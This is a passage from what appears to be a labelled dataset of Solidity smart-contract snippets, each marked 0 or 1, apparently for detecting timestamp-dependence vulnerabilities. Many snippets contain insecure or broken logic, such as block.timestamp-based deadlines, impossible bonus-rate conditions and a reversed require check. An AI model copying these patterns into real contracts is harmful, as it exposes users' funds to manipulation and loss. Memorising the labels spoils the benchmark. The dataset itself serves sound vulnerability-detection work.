z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract MLBNFT {    uint public isAttached = 10;    function requestDetachment(uint256 _tokenId) public returns (uint) {        if(isAttached > 1) {            require(isAttached == 1);        } else {            isAttached = block.timestamp;        }        return isAttached;    }}
1<CODESPLIT>contract LegendsCrowdfund {    uint public start;    uint public limitVIP;    mapping (address => uint) public recipientVIP;    uint public totalVIP;    function purchaseMembership(address recipient) external payable returns(uint){        uint VIP = msg.value * 10;        if (block.timestamp - start < 2 weeks) {            VIP = (VIP * 10) / 9;        }        recipientVIP[recipient] += VIP;        totalVIP += VIP;        if (totalVIP > limitVIP) { throw; }        return VIP;    }}
1<CODESPLIT>contract RaiseFundsForACause {    address public receiver;    uint256 public expirationInSeconds;    bool public hasBeenClaimed;    uint256 public timeStarted;    function receiverWithdraw() public {        require(block.timestamp < (timeStarted + expirationInSeconds));        require(hasBeenClaimed == false);        hasBeenClaimed = true;        receiver.transfer(this.balance);        return;    }}
1<CODESPLIT>contract EmpireCrowdsale{  uint256 public weiRaised;  uint256 public softCap;  uint256 public gracePeriodStart;  function buyTokens(address beneficiary) payable returns(uint256){    if ((weiRaised >= softCap * 1 ether) && gracePeriodStart == 0)        gracePeriodStart = block.timestamp;    return gracePeriodStart;    }}
0<CODESPLIT>contract Lucky8d {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }         modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                 modifier onlyAdministrator(){        require(msg.sender == owner);        _;    }    modifier limitBuy() {        if(limit && msg.value > 2 ether && msg.sender != owner) {              if ((msg.value) < address(this).balance && (address(this).balance-(msg.value)) >= 50 ether) {                  limit = false;            }            else {                revert();              }        }        _;    }         event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );    event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );    event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );    event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (        uint256 amount,        uint256 timestamp    );         event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );         string public name = "Lucky8D";    string public symbol = "Lucky";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 20;      uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;         uint256 public stakingRequirement = 0;             mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => address) internal referralOf_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => bool) internal alreadyBought;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;    bool internal whitelist_ = true;    bool internal limit = true;    address public owner;              constructor()        public    {        owner = msg.sender;        whitelisted_[msg.sender] = true;                 whitelisted_[0x8B4cE0C6021eb6AA43B854fB262E03F207e9ceBb] = true;        whitelist_ = true;    }         function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }         function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }         function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                   address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 uint256 _tokens = purchaseTokens(_dividends, 0x0);                 emit onReinvestment(_customerAddress, _dividends, _tokens);    }         function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                 withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                   payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 _customerAddress.transfer(_dividends);                 emit onWithdraw(_customerAddress, _dividends);    }         function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends));        address _referredBy = referralOf_[_customerAddress];        if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);        }                 tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                 int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                 if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                 emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }          function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                 if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                 payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                 emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                 return true;    }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                 profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                 emit OnRedistribution(ethereum, block.timestamp);    }         function setAdministrator(address _newAdmin)        onlyAdministrator()        external    {        owner = _newAdmin;    }         function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }         function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }         function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }              function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }         function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }         function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }         function myDividends(bool _includeReferralBonus)        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }         function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }         function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }         function sellPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }         function buyPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }         function calculateTokensReceived(uint256 _ethereumToSpend)        public        view        returns(uint256)    {        uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereumToSpend, dividendFee_),100);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        return _amountOfTokens;    }         function calculateEthereumReceived(uint256 _tokensToSell)        public        view        returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends =  SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }    function disableWhitelist() onlyAdministrator() external {        whitelist_ = false;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        limitBuy()        internal        returns(uint256)    {                          if (whitelisted_[msg.sender] == false && whitelist_ == true) {            revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingEthereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                 if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement &&            referralOf_[_customerAddress] == 0x0000000000000000000000000000000000000000 &&            alreadyBought[_customerAddress] == false        ){            referralOf_[_customerAddress] = _referredBy;                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                    _fee = _dividends * magnitude;                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));                _fee = _dividends * magnitude;            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                 if(tokenSupply_ > 0){                         tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                         profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                         _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));        } else {                         tokenSupply_ = _amountOfTokens;        }                 tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                          int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;        alreadyBought[_customerAddress] = true;                 emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);        return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =         (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;        return _tokensReceived;    }         function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }              function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
0<CODESPLIT>contract DELCToken is BurnableToken, MintableToken, PausableToken {     string public name;  string public symbol;     uint8 public decimals;  constructor() public {    name = "DELC Relation Person Token";    symbol = "DELC";    decimals = 18;    totalSupply = 10000000000 * 10 ** uint256(decimals);         balances[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);      }                     }
1<CODESPLIT>contract ContinuousSale {    uint256 public constant BUCKET_SIZE = 12 hours;    uint256 public lastBucket = 0;    uint256 public bucketAmount = 0;    function prepareContinuousPurchase() internal {        uint256 timestamp = block.timestamp;        uint256 bucket = timestamp - (timestamp % BUCKET_SIZE);        if (bucket > lastBucket) {            lastBucket = bucket;            bucketAmount = 0;        }        return;    }}
0<CODESPLIT>contract LastWillContractOraclize {    uint public checkInterval;    uint public lastActiveTs;    event NeedRepeatCheck(bool isAccident);    bool internal accidentOccurs = false;    function __callback(bytes32 queryId, string result) {        if (bytes(result).length == 0) {            accidentOccurs  = (block.timestamp - lastActiveTs >= checkInterval);        }        if (accidentOccurs) {            NeedRepeatCheck(true);        }        return;    }}
0<CODESPLIT>contract Cillionaire{    enum State {PARTICIPATION, CHOOSE_WINNER}    State public state;    uint public participationEndTimestamp;    function cancel() external {        if (msg.sender == 1) {            require(state == State.PARTICIPATION || state == State.CHOOSE_WINNER);        } else {            require((state == State.CHOOSE_WINNER) && (participationEndTimestamp != 0) && (block.timestamp > participationEndTimestamp + 1 days));        }        return;    }}
0<CODESPLIT>contract EscrowAccountCrowdsale is TimedCrowdsale, Ownable {  using SafeMath for uint256;  EscrowVault public vault;   function EscrowAccountCrowdsale() public {    vault = new EscrowVault(wallet);  }  function returnInvestoramount(address _beneficiary, uint256 _percentage) internal onlyOwner {    vault.refund(_beneficiary,_percentage);  }  function afterWhtelisted(address _beneficiary) internal onlyOwner{      vault.closeAfterWhitelisted(_beneficiary);  }  function _forwardFunds() internal {    vault.deposit.value(msg.value)(msg.sender);  }}
0<CODESPLIT>contract EscrowVault is Ownable {  using SafeMath for uint256;  mapping (address => uint256) public deposited;  address public wallet;  event Closed();  event Refunded(address indexed beneficiary, uint256 weiAmount);  function EscrowVault(address _wallet) public {    require(_wallet != address(0));    wallet = _wallet;     }  function deposit(address investor) onlyOwner  payable {    deposited[investor] = deposited[investor].add(msg.value);  }   function closeAfterWhitelisted(address _beneficiary) onlyOwner public {       uint256 depositedValue = deposited[_beneficiary];    deposited[_beneficiary] = 0;    wallet.transfer(depositedValue);  }     function refund(address investor, uint256 _percentage)onlyOwner  {    uint256 depositedValue = deposited[investor];    depositedValue=depositedValue.sub(_percentage);       investor.transfer(depositedValue);    wallet.transfer(_percentage);    emit Refunded(investor, depositedValue);     deposited[investor] = 0;  }}
0<CODESPLIT>contract AnsaCrowdsale is TimedCrowdsale, MintedCrowdsale,EscrowAccountCrowdsale,PostDeliveryCrowdsale { enum Stage {PROCESS1_FAILED, PROCESS1_SUCCESS,PROCESS2_FAILED, PROCESS2_SUCCESS,PROCESS3_FAILED, PROCESS3_SUCCESS} 		enum Phase {PHASE1, PHASE2,PHASE3}	Phase public phase;   struct whitelisted{       Stage  stage; }  uint256 public adminCharge_p1=0.010 ether;  uint256 public adminCharge_p2=0.13 ether;  uint256 public adminCharge_p3=0.14 ether;  uint256 public cap=750 ether;// softcap is 750 ether  uint256 public goal=4500 ether;// hardcap is 4500 ether  uint256 public minContribAmount = 0.1 ether; // min invesment  mapping(address => whitelisted) public whitelist;  mapping (address => uint256) public investedAmountOf;  uint256 public investorCount;  uint256 public constant DECIMALFACTOR = 10**uint256(18);  event updateRate(uint256 tokenRate, uint256 time);     function AnsaCrowdsale(uint256 _starttime, uint256 _endTime, uint256 _rate, address _wallet,ERC20 _token)  TimedCrowdsale(_starttime,_endTime)Crowdsale(_rate, _wallet,_token)  {      phase = Phase.PHASE1;  }      function () external payable {    buyTokens(msg.sender);  }    function buyTokens(address _beneficiary) public payable onlyWhileOpen{    require(_beneficiary != address(0));    require(validPurchase());      uint256 weiAmount = msg.value;    uint256 tokens = weiAmount.mul(rate);    uint256 volumebasedBonus=0;    if(phase == Phase.PHASE1){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase1(tokens)).div(100);    }else if(phase == Phase.PHASE2){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase2(tokens)).div(100);    }else{    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase3(tokens)).div(100);    }    tokens=tokens.add(volumebasedBonus);    _preValidatePurchase( _beneficiary,  weiAmount);    weiRaised = weiRaised.add(weiAmount);    _processPurchase(_beneficiary, tokens);    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);    _forwardFunds();    if(investedAmountOf[msg.sender] == 0) {           investorCount++;        }        investedAmountOf[msg.sender] = investedAmountOf[msg.sender].add(weiAmount);  }    function tokensaleToOtherCoinUser(address beneficiary, uint256 weiAmount) public onlyOwner onlyWhileOpen {    require(beneficiary != address(0) && weiAmount > 0);    uint256 tokens = weiAmount.mul(rate);    uint256 volumebasedBonus=0;    if(phase == Phase.PHASE1){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase1(tokens)).div(100);    }else if(phase == Phase.PHASE2){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase2(tokens)).div(100);    }else{    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase3(tokens)).div(100);    }    tokens=tokens.add(volumebasedBonus);    weiRaised = weiRaised.add(weiAmount);    _processPurchase(beneficiary, tokens);    emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);    }        function validPurchase() internal constant returns (bool) {    bool minContribution = minContribAmount <= msg.value;    return  minContribution;  }      function getTokenVolumebasedBonusRateForPhase1(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint256 valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 30;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 35;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 40;        } else{            bonusRate = 25;        }        return bonusRate;    }     function getTokenVolumebasedBonusRateForPhase2(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 25;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 30;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 35;        } else{            bonusRate = 20;        }        return bonusRate;    }         function getTokenVolumebasedBonusRateForPhase3(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 20;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 25;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 30;        } else{            bonusRate = 15;        }        return bonusRate;    }    	function startPhase2(uint256 _startTime) public onlyOwner {      	require(_startTime>0);      	phase = Phase.PHASE2;      	openingTime=_startTime;         }     	function startPhase3(uint256 _startTime) public onlyOwner {      	require(0> _startTime);      	phase = Phase.PHASE3;        openingTime=_startTime;   }  modifier isWhitelisted(address _beneficiary) {    require(whitelist[_beneficiary].stage==Stage.PROCESS3_SUCCESS);    _;  }  function addToWhitelist(address _beneficiary,uint256 _stage) external onlyOwner {      require(_beneficiary != address(0));      require(_stage>0);   if(_stage==1){     whitelist[_beneficiary].stage=Stage.PROCESS1_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p1);     failedWhitelist(_beneficiary);     investedAmountOf[_beneficiary]=0; }else if(_stage==2){     whitelist[_beneficiary].stage=Stage.PROCESS1_SUCCESS; }else if(_stage==3){     whitelist[_beneficiary].stage=Stage.PROCESS2_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p2);     failedWhitelist(_beneficiary);          investedAmountOf[_beneficiary]=0; }else if(_stage==4){     whitelist[_beneficiary].stage=Stage.PROCESS2_SUCCESS; }else if(_stage==5){     whitelist[_beneficiary].stage=Stage.PROCESS3_FAILED;     returnInvestoramount(_beneficiary,adminCharge_p3);     failedWhitelist(_beneficiary);          investedAmountOf[_beneficiary]=0;     }else if(_stage==6){     whitelist[_beneficiary].stage=Stage.PROCESS3_SUCCESS;     afterWhtelisted( _beneficiary); }  }   function withdrawTokens() public isWhitelisted(msg.sender)  {    require(hasClosed());    uint256 amount = balances[msg.sender];    require(amount > 0);    balances[msg.sender] = 0;    _deliverTokens(msg.sender, amount);     }    function changeEndtime(uint256 _endTime) public onlyOwner {    require(_endTime > 0);     closingTime = _endTime;    }  function changeRate(uint256 _rate) public onlyOwner {    require(_rate > 0);     rate = _rate;    emit updateRate(_rate,block.timestamp);    }  function changeAdminCharges(uint256 _p1,uint256 _p2,uint256 _p3) public onlyOwner {    require(_p1 > 0);    require(_p2 > 0);     require(_p3 > 0);     adminCharge_p1=_p1;    adminCharge_p2=_p2;    adminCharge_p3=_p3;        }      function changeMinInvestment(uint256 _minInvestment) public onlyOwner {     require(_minInvestment > 0);     minContribAmount=_minInvestment;  }  function capReached() public view returns (bool) {    return weiRaised >= cap;  }  function goalReached() public view returns (bool) {    return weiRaised >= goal;  }  	function tokenDistribution(address _to, uint256 _value)public onlyOwner {        require (           _to != 0x0 && _value > 0);        _processPurchase(_to, _value);        whitelist[_to].stage=Stage.PROCESS3_SUCCESS;    }}
0<CODESPLIT>contract ERC23BasicToken  {    using SafeMath for uint256;    uint256 public totalSupply;    mapping(address => uint256) balances;    event Transfer(address indexed from, address indexed to, uint256 value);    event Transfer(address indexed from, address indexed to, uint256 value, bytes data);    function tokenFallback(address _from, uint256 _value, bytes  _data) external {        throw;    }    function transfer(address _to, uint256 _value, bytes _data) returns  (bool success) {        require(_to != address(0));        if(isContract(_to)) {            transferToContract(_to, _value, _data);        }        else {            transferToAddress(_to, _value, _data);        }        return true;    }    function transfer(address _to, uint256 _value) {        require(_to != address(0));        bytes memory empty;        if(isContract(_to)) {            transferToContract(_to, _value, empty);        }        else {            transferToAddress(_to, _value, empty);        }    }    function transferToAddress(address _to, uint256 _value, bytes _data) internal {        require(_to != address(0));        balances[msg.sender] = balances[msg.sender].sub(_value);        balances[_to] = balances[_to].add(_value);        emit Transfer(msg.sender, _to, _value);        emit Transfer(msg.sender, _to, _value, _data);    }    function transferToContract(address _to, uint256 _value, bytes _data) internal {        require(_to != address(0));        balances[msg.sender] = balances[msg.sender].sub( _value);        balances[_to] = balances[_to].add( _value);        ContractReceiver receiver = ContractReceiver(_to);        receiver.tokenFallback(msg.sender, _value, _data);        emit Transfer(msg.sender, _to, _value);        emit Transfer(msg.sender, _to, _value, _data);    }    function balanceOf(address _owner) constant returns (uint256 balance) {        return balances[_owner];    }    function isContract(address _addr) returns (bool is_contract) {          uint256 length;          assembly {              length := extcodesize(_addr)          }          if(length>0) {              return true;          }          else {              return false;          }    }}
0<CODESPLIT>contract ERC23StandardToken is ERC23BasicToken {    mapping (address => mapping (address => uint256)) allowed;    event Approval (address indexed owner, address indexed spender, uint256 value);    function transferFrom(address _from, address _to, uint256 _value) {    require (_value > 0);    require(_to != address(0));    require(_from != address(0));    require(_value <= balances[_from]);    require(_value <= allowed[_from][msg.sender]);    balances[_from] = balances[_from].sub(_value);    balances[_to] = balances[_to].add(_value);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);    emit Transfer(_from, _to, _value);    }    function approve(address _spender, uint256 _value) {        require (_value > 0);        require(_spender != address(0));        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);    }    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {        return allowed[_owner][_spender];    }}
1<CODESPLIT>contract ANSAToken is MintableToken {   string public name="ANSA TOKEN";  string public symbol="ANSA";  uint8 public decimals=18;  uint256 public tradeStartTime;  function tradeStarttime(uint256 _startTime)public onlyOwner{       tradeStartTime=_startTime.add(1 years);   }      function hasTrade() public view returns (bool) {    return block.timestamp>tradeStartTime;  }   function transfer(address _to,uint256 _value) public{       require(hasTrade());       require(_to != address(0));        bytes memory empty;        if(isContract(_to)) {             transferToContract(_to, _value, empty);        }        else {            transferToAddress(_to, _value, empty);        }    }         function transfer(address _to, uint256 _value, bytes _data)public  returns (bool success)  {        require(hasTrade());        require(_to != address(0));        if(isContract(_to)) {            transferToContract(_to, _value, _data);        }        else {            transferToAddress(_to, _value, _data);        }        return true;    }  function transferFrom(address _from, address _to, uint256 _value) {    require(hasTrade());    require (_value > 0);    require(_to != address(0));    require(_from != address(0));    require(_value <= balances[_from]);    require(_value <= allowed[_from][msg.sender]);    balances[_from] = balances[_from].sub(_value);    balances[_to] = balances[_to].add(_value);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);    emit Transfer(_from, _to, _value);    }}
0<CODESPLIT>contract Registry {    address public RegistryAddress;    modifier onlyAdmin() {        require(msg.sender == getAddress("admin"));        _;    }    function getAddress(string AddressName) internal view returns(address) {        AddressRegistry aRegistry = AddressRegistry(RegistryAddress);        address realAddress = aRegistry.getAddr(AddressName);        require(realAddress != address(0));        return realAddress;    }}
1<CODESPLIT>contract Deposit is Registry {    bool public Paused;    function setPause(bool isPaused) onlyAdmin public {        Paused = isPaused;    }    modifier paused() {        require(!Paused);        _;    }    event eDeposit(address Investor, uint value);    uint256 public claimRate;    uint256 public ethRaised;    uint256 public unClaimedEther;    uint256 public ClaimingTimeLimit;    bool public isCharged = true;    mapping(address => uint256) public Investors;    function setCharge(bool chargeBool) onlyAdmin public {        isCharged = chargeBool;    }    function SetClaimRate(uint256 weiAmt) onlyAdmin public {        claimRate = weiAmt;        ClaimingTimeLimit = block.timestamp + 7 * 24 * 60 * 60;    }    function () paused public payable {        require(block.timestamp > ClaimingTimeLimit);        Investors[msg.sender] += msg.value;        unClaimedEther += msg.value;        emit eDeposit(msg.sender, msg.value);    }    function getClaimEst(address Claimer) public view returns(uint256 ClaimEstimate) {        uint NoOfMTU = Investors[Claimer] / claimRate;        return NoOfMTU;    }    function ClaimMTU(bool claim) paused public {        uint256 ethVal = Investors[msg.sender];        require(ethVal >= claimRate);        if (claim) {            require(claimRate > 0);            require(block.timestamp < ClaimingTimeLimit);            ethRaised += ethVal;            uint256 claimTokens = ethVal / claimRate;            address tokenAddress = getAddress("unit");            token tokenTransfer = token(tokenAddress);            tokenTransfer.transfer(msg.sender, claimTokens);            if (isCharged) {getAddress("team").transfer(ethVal / 20);}        } else {            msg.sender.transfer(ethVal);        }        Investors[msg.sender] -= ethVal;        unClaimedEther -= ethVal;    }}
1<CODESPLIT>contract Redeem is Deposit {    event eAllowedMTU(address LeavingAway, uint NoOfTokens);    event eRedeem(address Investor, uint NoOfTokens, uint withdrawVal);    uint256 public redeemRate;    uint256 public ethRedeemed;    uint256 public unRedeemedMTU;    uint256 public RedeemingTimeLimit;    mapping(address => uint256) public Redeemer;            function SetRedeemRate(uint256 weiAmt) onlyAdmin public {        redeemRate = weiAmt;        RedeemingTimeLimit = block.timestamp + 7 * 24 * 60 * 60;    }    function DepositMTU(uint256 NoOfTokens) paused public {        require(block.timestamp > RedeemingTimeLimit);        address tokenAddress = getAddress("unit");        token tokenFunction = token(tokenAddress);        tokenFunction.transferFrom(msg.sender, address(this), NoOfTokens);        unRedeemedMTU += NoOfTokens;        Redeemer[msg.sender] += NoOfTokens;        emit eAllowedMTU(msg.sender, NoOfTokens);    }    function RedeemMTU(bool redeem) paused public {        uint256 AppliedUnits = Redeemer[msg.sender];        require(AppliedUnits > 0);        address tokenAddress = getAddress("unit");        token tokenFunction = token(tokenAddress);        if (redeem) {            require(block.timestamp < RedeemingTimeLimit);            require(redeemRate > 0);            uint256 withdrawVal = AppliedUnits * redeemRate;            